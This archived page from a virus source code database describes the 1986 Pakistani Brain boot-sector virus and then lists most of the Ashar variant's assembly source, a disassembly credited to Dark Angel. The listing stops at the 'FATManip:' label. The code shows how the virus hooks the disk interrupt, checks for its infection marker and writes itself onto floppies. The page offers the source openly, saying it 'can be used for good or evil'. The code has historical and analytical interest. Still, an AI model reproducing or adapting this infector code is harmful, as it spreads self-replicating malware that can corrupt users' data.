<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: brain_asm</title>
<meta name="KEYWORDS" content="brain.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for brain.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="b-52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b-52_asm.php">b-52_asm</a><br>
<a href="backfind_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backfind_pas.php">backfind_pas</a><br>
<a href="backtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/backtime_asm.php">backtime_asm</a><br>
<a href="badattit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badattit_asm.php">badattit_asm</a><br>
<a href="badboy20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy20_asm.php">badboy20_asm</a><br>
<a href="badboy2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy2_asm.php">badboy2_asm</a><br>
<a href="badboy___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy___asm.php">badboy___asm</a><br>
<a href="badboy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy__asm.php">badboy__asm</a><br>
<a href="badboy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badboy_asm.php">badboy_asm</a><br>
<a href="badbrain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrain_asm.php">badbrain_asm</a><br>
<a href="badbrn12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badbrn12_asm.php">badbrn12_asm</a><br>
<a href="bad_cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_cmnd_asm.php">bad_cmnd_asm</a><br>
<a href="bad-cmnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad-cmnd_asm.php">bad-cmnd_asm</a><br>
<a href="bad_reli_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_reli_asm.php">bad_reli_asm</a><br>
<a href="badseed1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed1_asm.php">badseed1_asm</a><br>
<a href="badseed2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/badseed2_asm.php">badseed2_asm</a><br>
<a href="bad_seed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bad_seed_asm.php">bad_seed_asm</a><br>
<a href="bait1024_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait1024_asm.php">bait1024_asm</a><br>
<a href="bait512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bait512_asm.php">bait512_asm</a><br>
<a href="ball_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/ball_asm.php">ball_asm</a><br>
<a href="basic0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic0_asm.php">basic0_asm</a><br>
<a href="basic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/basic_asm.php">basic_asm</a><br>
<a href="b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/b_asm.php">b_asm</a><br>
<a href="batch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batch_asm.php">batch_asm</a><br>
<a href="batvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/batvir_asm.php">batvir_asm</a><br>
<a href="bb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bb_asm.php">bb_asm</a><br>
<a href="bbnop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbnop_asm.php">bbnop_asm</a><br>
<a href="bbrains_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bbrains_asm.php">bbrains_asm</a><br>
<a href="beast-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beast-b_asm.php">beast-b_asm</a><br>
<a href="beavis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beavis_asm.php">beavis_asm</a><br>
<a href="becky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/becky_asm.php">becky_asm</a><br>
<a href="bedtime_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bedtime_asm.php">bedtime_asm</a><br>
<a href="beep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/beep_asm.php">beep_asm</a><br>
<a href="bengal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bengal_asm.php">bengal_asm</a><br>
<a href="berylium_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/berylium_asm.php">berylium_asm</a><br>
<a href="bill_ted_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bill_ted_c.php">bill_ted_c</a><br>
<a href="bin_acid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin_acid_asm.php">bin_acid_asm</a><br>
<a href="bin-obs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bin-obs_asm.php">bin-obs_asm</a><br>
<a href="biohazrd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biohazrd_asm.php">biohazrd_asm</a><br>
<a href="biosdata_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biosdata_asm.php">biosdata_asm</a><br>
<a href="bios_men_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bios_men_asm.php">bios_men_asm</a><br>
<a href="biowar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/biowar_asm.php">biowar_asm</a><br>
<a href="bitaddct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bitaddct_asm.php">bitaddct_asm</a><br>
<a href="bizarre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bizarre_asm.php">bizarre_asm</a><br>
<a href="bjec-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-3_asm.php">bjec-3_asm</a><br>
<a href="bjec-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-4_asm.php">bjec-4_asm</a><br>
<a href="bjec-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-5_asm.php">bjec-5_asm</a><br>
<a href="bjec-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-6_asm.php">bjec-6_asm</a><br>
<a href="bjec-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-7_asm.php">bjec-7_asm</a><br>
<a href="bjec-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-8_asm.php">bjec-8_asm</a><br>
<a href="bjec-9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bjec-9_asm.php">bjec-9_asm</a><br>
<a href="blacjec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blacjec_asm.php">blacjec_asm</a><br>
<a href="bljec_3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_3a_asm.php">bljec_3a_asm</a><br>
<a href="bljec-3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-3a_asm.php">bljec-3a_asm</a><br>
<a href="bljec_4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_4a_asm.php">bljec_4a_asm</a><br>
<a href="bljec-4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-4a_asm.php">bljec-4a_asm</a><br>
<a href="bljec_5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_5a_asm.php">bljec_5a_asm</a><br>
<a href="bljec-5a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-5a_asm.php">bljec-5a_asm</a><br>
<a href="bljec5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec5_asm.php">bljec5_asm</a><br>
<a href="bljec_6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_6a_asm.php">bljec_6a_asm</a><br>
<a href="bljec-6a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-6a_asm.php">bljec-6a_asm</a><br>
<a href="bljec_7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_7a_asm.php">bljec_7a_asm</a><br>
<a href="bljec-7a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-7a_asm.php">bljec-7a_asm</a><br>
<a href="bljec_8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_8a_asm.php">bljec_8a_asm</a><br>
<a href="bljec-8a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-8a_asm.php">bljec-8a_asm</a><br>
<a href="bljec_9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec_9a_asm.php">bljec_9a_asm</a><br>
<a href="bljec-9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec-9a_asm.php">bljec-9a_asm</a><br>
<a href="bljec9a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9a_asm.php">bljec9a_asm</a><br>
<a href="bljec9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bljec9_asm.php">bljec9_asm</a><br>
<a href="blknight_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/blknight_asm.php">blknight_asm</a><br>
<a href="bloody_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bloody_asm.php">bloody_asm</a><br>
<a href="bob_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bob_asm.php">bob_asm</a><br>
<a href="bobross_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobross_asm.php">bobross_asm</a><br>
<a href="bobvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bobvirus_asm.php">bobvirus_asm</a><br>
<a href="bomber_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bomber_c.php">bomber_c</a><br>
<a href="bontchev_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bontchev_pas.php">bontchev_pas</a><br>
<a href="boot1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot1_asm.php">boot1_asm</a><br>
<a href="boot2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot2_asm.php">boot2_asm</a><br>
<a href="boot410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot410_asm.php">boot410_asm</a><br>
<a href="boot___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot___asm.php">boot___asm</a><br>
<a href="boot__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot__asm.php">boot__asm</a><br>
<a href="boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/boot_asm.php">boot_asm</a><br>
<a href="bootvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bootvir_asm.php">bootvir_asm</a><br>
<a href="botdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/botdos_asm.php">botdos_asm</a><br>
<a href="bouncbal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bouncbal_asm.php">bouncbal_asm</a><br>
<a href="brain0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain0_asm.php">brain0_asm</a><br>
<a href="brain2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain2_asm.php">brain2_asm</a><br>
<a href="brain3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain3_asm.php">brain3_asm</a><br>
<a href="brain___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain___asm.php">brain___asm</a><br>
<a href="brain_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_asm.php">brain_asm</a><br>
<a href="brainext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brainext_asm.php">brainext_asm</a><br>
<a href="brain_v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v1_asm.php">brain_v1_asm</a><br>
<a href="brain-v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v1_asm.php">brain-v1_asm</a><br>
<a href="brain_v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain_v3_asm.php">brain_v3_asm</a><br>
<a href="brain-v3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brain-v3_asm.php">brain-v3_asm</a><br>
<a href="breeze___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze___asm.php">breeze___asm</a><br>
<a href="breeze__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze__asm.php">breeze__asm</a><br>
<a href="breeze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/breeze_asm.php">breeze_asm</a><br>
<a href="brother1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother1_asm.php">brother1_asm</a><br>
<a href="brother2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother2_asm.php">brother2_asm</a><br>
<a href="brother3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother3_asm.php">brother3_asm</a><br>
<a href="brother4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother4_asm.php">brother4_asm</a><br>
<a href="brother5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother5_asm.php">brother5_asm</a><br>
<a href="brother__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother__asm.php">brother__asm</a><br>
<a href="brother_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brother_asm.php">brother_asm</a><br>
<a href="brthr2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr2_asm.php">brthr2_asm</a><br>
<a href="brthr3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/brthr3_asm.php">brthr3_asm</a><br>
<a href="bsv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv__asm.php">bsv__asm</a><br>
<a href="bsv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bsv_asm.php">bsv_asm</a><br>
<a href="bubbles1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles1_asm.php">bubbles1_asm</a><br>
<a href="bubbles2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles2_asm.php">bubbles2_asm</a><br>
<a href="bubbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bubbles_asm.php">bubbles_asm</a><br>
<a href="bulldoze_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bulldoze_asm.php">bulldoze_asm</a><br>
<a href="burg_541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_541_asm.php">burg_541_asm</a><br>
<a href="burg-541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-541_asm.php">burg-541_asm</a><br>
<a href="burg541__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541__asm.php">burg541__asm</a><br>
<a href="burg541_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg541_asm.php">burg541_asm</a><br>
<a href="burg_cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_cia_asm.php">burg_cia_asm</a><br>
<a href="burg-cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg-cia_asm.php">burg-cia_asm</a><br>
<a href="burger2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger2_asm.php">burger2_asm</a><br>
<a href="burger__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger__asm.php">burger__asm</a><br>
<a href="burger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_asm.php">burger_asm</a><br>
<a href="burger_c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burger_c_asm.php">burger_c_asm</a><br>
<a href="burgr____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burgr____asm.php">burgr____asm</a><br>
<a href="burg_vi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vi__asm.php">burg_vi__asm</a><br>
<a href="burg_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_asm.php">burg_vir_asm</a><br>
<a href="burg_vir_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burg_vir_bas.php">burg_vir_bas</a><br>
<a href="burma2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma2_asm.php">burma2_asm</a><br>
<a href="burma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/burma_asm.php">burma_asm</a><br>
<a href="bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bush_asm.php">bush_asm</a><br>
<a href="busted__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted__asm.php">busted__asm</a><br>
<a href="busted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/busted_asm.php">busted_asm</a><br>
<a href="butthole_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/butthole_asm.php">butthole_asm</a><br>
<a href="buttrfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttrfly_asm.php">buttrfly_asm</a><br>
<a href="buttsurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/buttsurf_asm.php">buttsurf_asm</a><br>
<a href="bv3_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bv3_bas.php">bv3_bas</a><br>
<a href="bw1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bw1_asm.php">bw1_asm</a><br>
<a href="bwme_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bwme_asm.php">bwme_asm</a><br>
<a href="bypass_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/bypass_asm.php">bypass_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p>
This boot sector infector virus has afflicted IBM PC and compatible systems
around the world since 1986 and is very infectious.  The first symptoms are 
often excessive activity by the floppy disk drives when they should not be
busy at all.
<p>
The Pakistani virus produced the following message when disassembled and
analyzed.  Not only is it one of the cleverest viruses written so far, it also
is unusual in giving such clear identification of the originators.
<p><pre>
...Welcome to the Dungeon
..   c 1986 Basit & Amjad (pvt) Ltd.
..        BRAIN COMPUTER SERVICES
...   730 Nizam Block
      ...  Allama Igbal Town
...   Lahore, Pakistan
..    Phone: 430791,443248,2800530
... Beware of this VIRUS
..     Contact us for vaccination
</pre><p>
...the announcement [was] right up front on the copyright notice near the
top of the directory... the volume label had been changed to read 
"(c) Brain."
<p>
The Pakistani Brain is one of the most complex viruses ever created.  It has
built-in structures to prevent it from being identified, destroyed, or damaged.
It very effectively executes its prime directive to replicate to as many 
computer systems as possible.  The Brain moves from its initial control point
through a number of modules that set up the system to prepare them for the
Brain to take further control.  A second segment of the virus program is used
to infect other systems; the appropriate segment of code is activated and the
entire virus is then transferred to the new host.
<p>
<textarea cols=90 rows=30>

; This is the ashar variant of the classic Pakistani Brain virus. It is large
; by today's standards, although it was one of the first.  It is a floppy only
; boot sector infector.

brain           segment byte public
                assume  cs:brain, ds:brain
; Disassembly done by Dark Angel of PHALCON/SKISM
                org     0

                cli
                jmp     entervirus
idbytes         db       34h, 12h
firsthead       db      0
firstsector     dw      2707h
curhead         db      0
cursector       dw      1
                db      0, 0, 0, 0
                db      'Welcome to the  Dungeon         '
copyright       db      '(c) 1986 Brain'
                db      17h
                db      '& Amjads (pvt) Ltd   VIRUS_SHOE '
                db      ' RECORD   v9.0   Dedicated to th'
                db      'e dynamic memories of millions o'
                db      'f virii who are no longer with u'
                db      's today - Thanks GOODNESS!!     '
                db      '  BEWARE OF THE er..VIRUS  : \th'
                db      'is program is catching      prog'
                db      'ram follows after these messeges'
                db      '..... $'
                db      '#@%$'
                db      '@!! '
entervirus:
                mov     ax,cs
                mov     ds,ax                   ; ds = 0
                mov     ss,ax                   ; set stack to after
                mov     sp,0F000h               ; virus
                sti
                mov     al,ds:[7C00h+offset firsthead]
                mov     ds:[7C00h+offset curhead],al
                mov     cx,ds:[7C00h+offset firstsector]
                mov     ds:[7C00h+offset cursector],cx
                call    calcnext
                mov     cx,5                    ; read five sectors
                mov     bx,7C00h+200h           ; after end of virus

loadnext:
                call    readdisk
                call    calcnext
                add     bx,200h
                loop    loadnext

                mov     ax,word ptr ds:[413h]   ; Base memory size in Kb
                sub     ax,7                    ; - 7 Kb
                mov     word ptr ds:[413h],ax   ; Insert as new value
                mov     cl,6
                shl     ax,cl                   ; Convert to paragraphs
                mov     es,ax
                mov     si,7C00h                ; Copy from virus start
                mov     di,0                    ; to start of memory
                mov     cx,1004h                ; Copy 1004h bytes
                cld
                rep     movsb
                push    es
                mov     ax,200h
                push    ax
                retf                            ; return to old boot sector

readdisk:
                push    cx
                push    bx
                mov     cx,4                    ; Try 4 times

tryread:
                push    cx
                mov     dh,ds:[7C00h+offset curhead]
                mov     dl,0                    ; Read sector from default
                mov     cx,ds:[7C00h+offset cursector]
                mov     ax,201h                 ; Disk to memory at es:bx
                int     13h
                jnc     readOK
                mov     ah,0                    ; Reset disk
                int     13h                     ; (force read track 0)
                pop     cx
                loop    tryread

                int     18h                     ; ROM basic on failure
readOK:
                pop     cx
                pop     bx
                pop     cx
                retn

calcnext:
                mov     al,byte ptr ds:[7C00h+offset cursector]
                inc     al
                mov     byte ptr ds:[7C00h+offset cursector],al
                cmp     al,0Ah
                jne     donecalc
                mov     byte ptr ds:[7C00h+offset cursector],1
                mov     al,ds:[7C00h+offset curhead]
                inc     al
                mov     ds:[7C00h+offset curhead],al
                cmp     al,2
                jne     donecalc
                mov     byte ptr ds:[7C00h+offset curhead],0
                inc     byte ptr ds:[7C00h+offset cursector+1]
donecalc:
                retn

; the following is a collection of garbage bytes
                db       00h, 00h, 00h, 00h, 32h,0E3h
                db       23h, 4Dh, 59h,0F4h,0A1h, 82h
                db      0BCh,0C3h, 12h, 00h, 7Eh, 12h
                db      0CDh, 21h,0A2h, 3Ch, 5Fh
a_data          dw      050Ch
; Second part of the virus begins here
                jmp     short entersecondpart
                db      '(c) 1986 Brain & Amjads (pvt) Ltd ',0
readcounter     db      4                       ; keep track of # reads
curdrive        db      0
int13flag       db      0

entersecondpart:
                mov     cs:readcounter,1Fh
                xor     ax,ax
                mov     ds,ax                   ; ds -> interrupt table
                mov     ax,ds:[13h*4]
                mov     ds:[6Dh*4],ax
                mov     ax,ds:[13h*4+2]
                mov     ds:[6Dh*4+2],ax
                mov     ax,offset int13         ; 276h
                mov     ds:[13h*4],ax
                mov     ax,cs
                mov     ds:[13h*4+2],ax
                mov     cx,4                    ; 4 tries
                xor     ax,ax
                mov     es,ax                   ; es -> interrupt table

tryreadbootsector:
                push    cx
                mov     dh,cs:firsthead
                mov     dl,0
                mov     cx,cs:firstsector
                mov     ax,201h                 ; read from default disk
                mov     bx,7C00h
                int     6Dh                     ; int 13h
                jnc     readbootOK
                mov     ah,0
                int     6Dh                     ; int 13h
                pop     cx
                loop    tryreadbootsector

                int     18h                     ; ROM basic on failure
readbootOK:                                     ; return control to
                                                ; original boot sector
;*              jmp     far ptr 0000:7C00h
                db      0EAh, 00h, 7Ch, 00h, 00h
                nop                             ; MASM NOP!!!
int13:
                sti
                cmp     ah,2                    ; if not read request,
                jne     doint13                 ; do not go further
                cmp     dl,2                    ; if after second floppy,
                ja      doint13                 ; do not go further
                cmp     ch,0                    ; if not reading boot sector,
                jne     regularread             ; go handle as usual
                cmp     dh,0                    ; if boot sector,
                je      readboot                ; do I<-/>/\|> stuff
regularread:
                dec     cs:readcounter          ; Infect after 4 reads
                jnz     doint13                 ; If counter still OK, don't
                                                ; do anything else
                jmp     short readboot          ; Otherwise, try to infect
doint13:
                jmp     exitint13h
readboot:
; FINISH THIS!
                mov     cs:int13flag,0          ; clear flag
                mov     cs:readcounter,4        ; reset counter
                push    ax
                push    bx
                push    cx
                push    dx
                mov     cs:curdrive,dl
                mov     cx,4

tryreadbootblock:
                push    cx
                mov     ah,0                    ; Reset disk
                int     6Dh
                jc      errorreadingbootblock   ; Try again
                mov     dh,0
                mov     cx,1
                mov     bx,offset readbuffer    ; buffer @ 6BEh
                push    es
                mov     ax,cs
                mov     es,ax
                mov     ax,201h
                int     6Dh                     ; Read boot sector
                pop     es
                jnc     continuestuff           ; continue if no error
errorreadingbootblock:
                pop     cx
                loop    tryreadbootblock

                jmp     short resetdisk         ; too many failures
                nop
continuestuff:
                pop     cx                      ; get system id in boot block
                mov     ax,word ptr cs:[offset readbuffer+4]
                cmp     ax,1234h                ; already infected?
                jne     dodisk                  ; if not, infect it
                mov     cs:int13flag,1          ; flag prev. infection
                jmp     short noreset
dodisk:
                push    ds
                push    es
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                push    si
                call    writevirus              ; infect the disk
                jc      failme                  ; exit on failure
                mov     cs:int13flag,2          ; flag success
                call    changeroot              ; manipulate volume label
failme:
                pop     si
                pop     es
                pop     ds
                jnc     noreset                 ; don't reset on success
resetdisk:
                mov     ah,0                    ; reset disk
                int     6Dh                     ; int 13h
noreset:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                cmp     cx,1
                jne     exitint13h
                cmp     dh,0
                jne     exitint13h
                cmp     cs:int13flag,1          ; already infected?
                jne     wasntinfected           ; if wasn't, go elsewhere
                mov     cx,word ptr cs:[offset readbuffer+7]
                mov     dx,word ptr cs:[offset readbuffer+5]
                mov     dl,cs:curdrive          ; otherwise, read real
                jmp     short exitint13h        ; boot sector
wasntinfected:
                cmp     cs:int13flag,2          ; successful infection?
                jne     exitint13h              ; if not, just do call
                mov     cx,cs:firstsector
                mov     dh,cs:firsthead
exitint13h:
                int     6Dh                     ; int 13h
                retf    2
                db      15 dup (0)

FATManip:                                       ; returns al as error code
